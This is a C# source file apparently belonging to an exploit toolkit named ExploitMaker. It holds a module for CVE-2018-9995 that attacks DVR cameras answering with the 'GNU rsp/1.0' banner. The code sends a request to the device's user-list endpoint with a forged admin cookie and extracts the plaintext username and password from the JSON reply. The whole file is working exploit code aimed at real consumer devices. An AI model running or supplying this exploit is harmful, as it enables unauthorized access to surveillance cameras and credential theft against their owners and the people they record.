using System.Collections.Generic;
using ExploitMaker;
using ExploitMaker.Exceptions;
using ExploitMaker.Helpers;
using ExploitMaker.Modules;
using Microsoft.CSharp.RuntimeBinder;

namespace Exploits
{
    public class CVE_2018_9995 : Module
    {
        public override string Description => "Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'. This exploit tries to get a JSON list with the credential in plain text.";

        public override string CommonName => "CVE-2018-9995";

        public override ExploitResult Run(Camera cam)
        {
            object result = null;
            try
            {
                //Try to connect, if we fail, because we do not get a response, the server is unreachable.
                if (!ConnectionHelper.IsOpenPort(cam.Host, int.Parse(cam.Port)))
                    throw new ExploituUreachableTargetException(cam, CommonName);

                //We wiil receive a JSON response, if it is not a JSON response, we will get an exception otherwise, the HTTP service is not availeable
                result = HttpHelper.Get(cam.UrlHttp + "/device.rsp?opt=user&cmd=list", new Dictionary<string, string> {{"uid", "admin"}}, true);
                if (result == null)
                    throw new ExploituUreachableTargetException(cam, CommonName);

                //We parse the JSON response to read the fields, if we get an error, is because the cam is not vulnerable, because the response is invalid.
                dynamic json = result;

                string username = json.list[0].uid;
                string pass = json.list[0].pwd;

                if (username != null && pass != null)
                    return new ExploitResult(true,
                        string.Format(Phrases.Test_Success, cam.Address, CommonName, "- The result is " + username + ":" + pass), "",
                        username, pass);

                return new ExploitResult(false, string.Format(Phrases.Test_NotVulnerable, cam.Address, CommonName), "");
            }
            catch (JsonParserErrorException ex)
            {
                //The server responds, but is not a JSON response.
                throw new ExploitFailException(cam, CommonName, ex.Message);
            }
            catch (RuntimeBinderException ex)
            {
                //Vulnerable but it is not possible parse
                if (result != null && result.ToString().Contains("\"list\":[{\"uid\":\""))
                {
                    var ms = string.Format(Phrases.Test_Success, cam.Address, CommonName, "- Please to get username and password check the comments in the output file");
                    return new ExploitResult(true, ms, "", result.ToString(), "");
                }

                //The server responds, the JSON is invalid.
                return new ExploitResult(false, string.Format(Phrases.Test_NotVulnerable, cam.Address, CommonName),ex.Message);

            }
        }
    }
}